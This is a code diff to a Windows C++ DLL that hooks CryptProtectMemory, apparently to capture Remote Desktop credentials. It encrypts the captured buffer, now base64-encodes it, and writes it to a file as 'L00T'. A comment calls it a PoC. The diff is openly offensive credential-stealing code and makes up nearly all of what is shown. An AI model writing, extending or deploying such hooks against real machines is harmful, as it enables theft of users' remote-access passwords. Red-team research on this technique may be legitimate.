@@ -1,8 +1,10 @@
 #include <Windows.h>
 #include <VersionHelpers.h>
 #include <string>
+#include <vector>
 
 #include "HookedHelpers.h"
+#include "Base64.h"
 #include "AES.h"
 
 #ifdef _WIN64
@@ -40,6 +42,8 @@ BOOL WriteToFile(std::string L00T)
 		return false; // hmmm..would this work in a dll?
 	}
 
+	// Throw a newline so nothing will be on the same line when it's written
+	L00T.push_back('\n');
 	WriteFile(hFile, L00T.c_str(), static_cast<DWORD>(L00T.size()), &lpNumberOfBytesWritten, NULL);
 	CloseHandle(hFile);
 	return true;
@@ -89,9 +93,9 @@ __declspec(dllexport) BOOL WINAPI HookedCryptProtectMemory(LPVOID pDataIn, DWORD
 			std::string lpBuffer2 = ConvertToString(lpBuffer);
 			EncryptBuffer->CNGEncrypt(lpBuffer2);
 
-			MessageBoxA(NULL, reinterpret_cast<LPCSTR>(EncryptBuffer->GetEncryptedString()), "Encrypted String", MB_OK);
-			//MessageBox(NULL, lpBuffer.c_str(), L"Just a PoC, not final", MB_OK);
-			WriteToFile(reinterpret_cast<LPCSTR>(EncryptBuffer->GetEncryptedString()));
+			// Convert the encrypted string to base64 for easier reading and whatever else
+			MessageBoxA(NULL, EncryptBuffer->GetEncodedString().c_str(), "Encrypted String", MB_OK);
+			WriteToFile(EncryptBuffer->GetEncodedString().c_str());
 
 			// Clean up the struct so it won't constantly send anything
 			RemoteDesktop.lpServerAddress.clear();
